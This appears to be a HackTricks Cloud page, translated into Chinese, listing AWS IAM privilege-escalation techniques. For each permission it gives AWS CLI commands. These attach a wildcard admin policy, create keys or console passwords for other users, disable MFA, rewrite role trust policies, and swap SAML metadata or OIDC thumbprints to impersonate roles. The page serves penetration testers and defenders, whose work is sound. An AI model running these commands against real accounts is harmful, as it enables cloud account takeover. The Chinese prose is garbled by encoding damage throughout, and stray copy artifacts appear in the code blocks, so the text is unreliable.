# AWS - IAM æƒé™æå‡

<details>

<summary><strong>é€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS çº¢é˜Ÿä¸“å®¶)</strong></a><strong>ä»é›¶å¼€å§‹å­¦ä¹  AWS é»‘å®¢æ”»å‡»ï¼</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨å¸Œæœ›åœ¨ HackTricks ä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½ HackTricks çš„ PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFT é›†åˆ**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥**åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

## IAM

æœ‰å…³ IAM çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹ï¼š

{% content-ref url="../aws-services/aws-iam-enum.md" %}
[aws-iam-enum.md](../aws-services/aws-iam-enum.md)
{% endcontent-ref %}

### **`iam:CreatePolicyVersion`**

æˆäºˆåˆ›å»ºæ–°çš„ IAM ç­–ç•¥ç‰ˆæœ¬çš„èƒ½åŠ›ï¼Œé€šè¿‡ä½¿ç”¨ `--set-as-default` æ ‡å¿—ç»•è¿‡å¯¹ `iam:SetDefaultPolicyVersion` æƒé™çš„éœ€æ±‚ã€‚è¿™ä½¿å¾—å¯ä»¥å®šä¹‰è‡ªå®šä¹‰æƒé™ã€‚

**åˆ©ç”¨å‘½ä»¤ï¼š**
```bash
aws iam create-policy-version --policy-arn <target_policy_arn> \
--policy-document file:///path/to/administrator/policy.json --set-as-default
```
**å½±å“ï¼š** ç›´æ¥é€šè¿‡å…è®¸å¯¹ä»»ä½•èµ„æºè¿›è¡Œä»»ä½•æ“ä½œæ¥æå‡æƒé™ã€‚

### **`iam:SetDefaultPolicyVersion`**

å…è®¸å°† IAM ç­–ç•¥çš„é»˜è®¤ç‰ˆæœ¬æ›´æ”¹ä¸ºå¦ä¸€ä¸ªç°æœ‰ç‰ˆæœ¬ï¼Œå¦‚æœæ–°ç‰ˆæœ¬å…·æœ‰æ›´å¤šæƒé™ï¼Œåˆ™å¯èƒ½æå‡æƒé™ã€‚

**Bash å‘½ä»¤ï¼š**
```bash
aws iam set-default-policy-version --policy-arn <target_policy_arn> --version-id v2
```
**å½±å“ï¼š** é€šè¿‡å¯ç”¨æ›´å¤šæƒé™é—´æ¥æå‡æƒé™ã€‚

### **`iam:CreateAccessKey`**

å…è®¸ä¸ºå…¶ä»–ç”¨æˆ·åˆ›å»ºè®¿é—®å¯†é’¥IDå’Œå¯†é’¥ï¼Œå¯èƒ½å¯¼è‡´æƒé™æå‡ã€‚

**åˆ©ç”¨ï¼š**
```bash
aws iam create-access-key --user-name <target_user>
```
**å½±å“ï¼š** é€šè¿‡æ‰¿æ‹…å…¶ä»–ç”¨æˆ·çš„æ‰©å±•æƒé™ç›´æ¥æå‡æƒé™ã€‚

### **`iam:CreateLoginProfile` | `iam:UpdateLoginProfile`**

å…è®¸åˆ›å»ºæˆ–æ›´æ–°ç™»å½•é…ç½®æ–‡ä»¶ï¼ŒåŒ…æ‹¬ä¸ºAWSæ§åˆ¶å°ç™»å½•è®¾ç½®å¯†ç ï¼Œå¯¼è‡´ç›´æ¥æå‡æƒé™ã€‚

**åˆ©ç”¨åˆ›å»ºï¼š**
```bash
aws iam create-login-profile --user-name target_user --no-password-reset-required \
--password '<password>'
```
**åˆ©ç”¨æ›´æ–°æ¼æ´ï¼š**
```bash
aws iam update-login-profile --user-name target_user --no-password-reset-required \
--password '<password>'
```
**å½±å“ï¼š** é€šè¿‡ä»¥â€œä»»æ„â€ç”¨æˆ·èº«ä»½ç™»å½•ç›´æ¥æå‡æƒé™ã€‚

### **`iam:UpdateAccessKey`**

å…è®¸å¯ç”¨è¢«ç¦ç”¨çš„è®¿é—®å¯†é’¥ï¼Œå¦‚æœæ”»å‡»è€…æ‹¥æœ‰è¢«ç¦ç”¨çš„å¯†é’¥ï¼Œå¯èƒ½å¯¼è‡´æœªæˆæƒè®¿é—®ã€‚

**åˆ©ç”¨ï¼š**

{% code overflow="wrap" %}
```bash
aws iam update-access-key --access-key-id <ACCESS_KEY_ID> --status Active --user-name <username>
```
{% endcode %}

**å½±å“ï¼š** é€šè¿‡é‡æ–°æ¿€æ´»è®¿é—®å¯†é’¥ç›´æ¥æå‡æƒé™ã€‚

### **`iam:CreateServiceSpecificCredential` | `iam:ResetServiceSpecificCredential`**

å…è®¸ä¸ºç‰¹å®šAWSæœåŠ¡ï¼ˆä¾‹å¦‚CodeCommitï¼ŒAmazon Keyspacesï¼‰ç”Ÿæˆæˆ–é‡ç½®å‡­è¯ï¼Œç»§æ‰¿å…³è”ç”¨æˆ·çš„æƒé™ã€‚

**åˆ›å»ºæ¼æ´åˆ©ç”¨ï¼š**

{% code overflow="wrap" %}
```bash
aws iam create-service-specific-credential --user-name <username> --service-name <service>
```
```markdown
**åˆ©ç”¨é‡ç½®æ¼æ´ï¼š**

{% code overflow="wrap" %}
```
```bash
aws iam reset-service-specific-credential --service-specific-credential-id <credential_id>
```
{% endcode %}

**å½±å“ï¼š** ç”¨æˆ·æœåŠ¡æƒé™å†…çš„ç›´æ¥æƒé™æå‡ã€‚

### **`iam:AttachUserPolicy` || `iam:AttachGroupPolicy`**

å…è®¸å°†ç­–ç•¥é™„åŠ åˆ°ç”¨æˆ·æˆ–ç»„ï¼Œé€šè¿‡ç»§æ‰¿é™„åŠ ç­–ç•¥çš„æƒé™ç›´æ¥æå‡æƒé™ã€‚

**é’ˆå¯¹ç”¨æˆ·çš„åˆ©ç”¨ï¼š**
```bash
aws iam attach-user-policy --user-name <username> --policy-arn "<policy_arn>"
```
**é’ˆå¯¹ç»„çš„åˆ©ç”¨ï¼š**
```bash
aws iam attach-group-policy --group-name <group_name> --policy-arn "<policy_arn>"
```
**å½±å“ï¼š** ç›´æ¥æå‡è‡³ç­–ç•¥æ‰€æˆäºˆçš„ä»»ä½•æƒé™ã€‚

### **`iam:AttachRolePolicy`,** (`sts:AssumeRole`|`iam:createrole`) | **`iam:PutUserPolicy` | `iam:PutGroupPolicy` | `iam:PutRolePolicy`**

å…è®¸å°†ç­–ç•¥é™„åŠ æˆ–åº”ç”¨äºè§’è‰²ã€ç”¨æˆ·æˆ–ç»„ï¼Œé€šè¿‡æˆäºˆé¢å¤–æƒé™æ¥å®ç°ç›´æ¥çš„æƒé™æå‡ã€‚

**é’ˆå¯¹è§’è‰²çš„åˆ©ç”¨ï¼š**
```bash
bashCopy codeaws iam attach-role-policy --role-name <role_name> --policy-arn "<policy_arn>"
```
**åˆ©ç”¨å†…è”ç­–ç•¥æ¼æ´ï¼š**
```bash
aws iam put-user-policy --user-name <username> --policy-name "<policy_name>" \
--policy-document "file:///path/to/policy.json"

aws iam put-group-policy --group-name <group_name> --policy-name "<policy_name>" \
--policy-document file:///path/to/policy.json

aws iam put-role-policy --role-name <role_name> --policy-name "<policy_name>" \
--policy-document file:///path/to/policy.json
```
æ‚¨å¯ä»¥ä½¿ç”¨ç±»ä¼¼çš„ç­–ç•¥ï¼š
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": [
"*"
],
"Resource": [
"*"
]
}
]
}
```
**å½±å“ï¼š** é€šè¿‡æ·»åŠ ç­–ç•¥ç›´æ¥æå‡æƒé™ã€‚

### **`iam:AddUserToGroup`**

å…è®¸å°†è‡ªå·±æ·»åŠ åˆ°IAMç»„ä¸­ï¼Œé€šè¿‡ç»§æ‰¿ç»„æƒé™æ¥æå‡æƒé™ã€‚

**åˆ©ç”¨ï¼š**

{% code overflow="wrap" %}
```bash
aws iam add-user-to-group --group-name <group_name> --user-name <username>
```
{% endcode %}

**å½±å“ï¼š** ç›´æ¥æå‡è‡³è¯¥ç»„æƒé™ç­‰çº§ã€‚

### **`iam:UpdateAssumeRolePolicy`**

å…è®¸æ›´æ”¹è§’è‰²çš„æ‰®æ¼”è§’è‰²ç­–ç•¥æ–‡æ¡£ï¼Œä½¿å¾—å¯ä»¥æ‰®æ¼”è¯¥è§’è‰²åŠå…¶å…³è”æƒé™ã€‚

**åˆ©ç”¨ï¼š**
```bash
aws iam update-assume-role-policy --role-name <role_name> \
--policy-document file:///path/to/assume/role/policy.json
```
```markdown
å½“ç­–ç•¥å¦‚ä¸‹æ‰€ç¤ºï¼Œå®ƒæˆäºˆç”¨æˆ·æ‰®æ¼”è§’è‰²çš„æƒé™ï¼š
```
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": "sts:AssumeRole",
"Principal": {
"AWS": "$USER_ARN"
}
}
]
}
```
**å½±å“ï¼š** é€šè¿‡æ‰¿æ‹…ä»»ä½•è§’è‰²çš„æƒé™ç›´æ¥æå‡æƒé™ã€‚

### **`iam:UploadSSHPublicKey` || `iam:DeactivateMFADevice`**

å…è®¸ä¸Šä¼ SSHå…¬é’¥ä»¥ç”¨äºCodeCommitçš„èº«ä»½éªŒè¯ï¼Œå¹¶åœç”¨MFAè®¾å¤‡ï¼Œå¯èƒ½å¯¼è‡´æ½œåœ¨çš„é—´æ¥æƒé™æå‡ã€‚

**SSHå¯†é’¥ä¸Šä¼ çš„åˆ©ç”¨ï¼š**
```bash
aws iam upload-ssh-public-key --user-name <username> --ssh-public-key-body <key_body>
```
**åˆ©ç”¨ MFA åœç”¨æ¼æ´ï¼š**
```bash
aws iam deactivate-mfa-device --user-name <username> --serial-number <serial_number>
```
**å½±å“ï¼š** é€šè¿‡å¯ç”¨CodeCommitè®¿é—®æˆ–ç¦ç”¨MFAä¿æŠ¤ï¼Œé—´æ¥æå‡æƒé™ã€‚

### **`iam:ResyncMFADevice`**

å…è®¸é‡æ–°åŒæ­¥MFAè®¾å¤‡ï¼Œå¯èƒ½é€šè¿‡æ“çºµMFAä¿æŠ¤é—´æ¥å¯¼è‡´æƒé™æå‡ã€‚

**Bashå‘½ä»¤ï¼š**
```bash
aws iam resync-mfa-device --user-name <username> --serial-number <serial_number> \
--authentication-code1 <code1> --authentication-code2 <code2>
```
**å½±å“ï¼š**é€šè¿‡æ·»åŠ æˆ–æ“çºµMFAè®¾å¤‡é—´æ¥æå‡æƒé™ã€‚

### `iam:UpdateSAMLProvider`, `iam:ListSAMLProviders`, (`iam:GetSAMLProvider`)

æ‹¥æœ‰è¿™äº›æƒé™ï¼Œä½ å¯ä»¥**æ›´æ”¹SAMLè¿æ¥çš„XMLå…ƒæ•°æ®**ã€‚ç„¶åï¼Œä½ å¯ä»¥æ»¥ç”¨**SAMLè”åˆè®¤è¯**ï¼Œä»¥ä»»ä½•**ä¿¡ä»»å®ƒçš„è§’è‰²**èº«ä»½**ç™»å½•**ã€‚

è¯·æ³¨æ„ï¼Œè¿™æ ·åš**åˆæ³•ç”¨æˆ·å°†æ— æ³•ç™»å½•**ã€‚ç„¶è€Œï¼Œä½ å¯ä»¥è·å–XMLï¼Œè¿™æ ·ä½ å°±å¯ä»¥æ”¾ç½®ä½ çš„XMLï¼Œç™»å½•å¹¶é…ç½®å›ä¹‹å‰çš„è®¾ç½®ã€‚
```bash
# List SAMLs
aws iam list-saml-providers

# Optional: Get SAML provider XML
aws iam get-saml-provider --saml-provider-arn <ARN>

# Update SAML provider
aws iam update-saml-provider --saml-metadata-document <value> --saml-provider-arn <arn>

## Login impersonating roles that trust the SAML provider

# Optional: Set the previous XML back
aws iam update-saml-provider --saml-metadata-document <previous-xml> --saml-provider-arn <arn>
```
{% hint style="info" %}
å¾…åŠäº‹é¡¹ï¼šä¸€ä¸ªèƒ½å¤Ÿç”ŸæˆSAMLå…ƒæ•°æ®å¹¶ä»¥æŒ‡å®šè§’è‰²ç™»å½•çš„å·¥å…·
{% endhint %}

### `iam:UpdateOpenIDConnectProviderThumbprint`, `iam:ListOpenIDConnectProviders`, (`iam:`**`GetOpenIDConnectProvider`**)

ï¼ˆä¸ç¡®å®šï¼‰å¦‚æœæ”»å‡»è€…æ‹¥æœ‰è¿™äº›**æƒé™**ï¼Œä»–å¯ä»¥æ·»åŠ ä¸€ä¸ªæ–°çš„**Thumbprint**ï¼Œä»¥ä¾¿ç™»å½•æ‰€æœ‰ä¿¡ä»»è¯¥æä¾›è€…çš„è§’è‰²ã€‚

{% code overflow="wrap" %}
```bash
# List providers
aws iam list-open-id-connect-providers
# Optional: Get Thumbprints used to not delete them
aws iam get-open-id-connect-provider --open-id-connect-provider-arn <ARN>
# Update Thumbprints (The thumbprint is always a 40-character string)
aws iam update-open-id-connect-provider-thumbprint --open-id-connect-provider-arn <ARN> --thumbprint-list 359755EXAMPLEabc3060bce3EXAMPLEec4542a3
```
## å‚è€ƒèµ„æ–™

* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)

<details>

<summary><strong>é€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS çº¢é˜Ÿä¸“å®¶)</strong></a><strong>ä»é›¶å¼€å§‹å­¦ä¹  AWS é»‘å®¢æŠ€æœ¯ï¼</strong></summary>

å…¶ä»–æ”¯æŒ HackTricks çš„æ–¹å¼ï¼š

* å¦‚æœæ‚¨å¸Œæœ›åœ¨ HackTricks ä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½ HackTricks çš„ PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTs é›†åˆ**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥**åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§**ã€‚

</details>
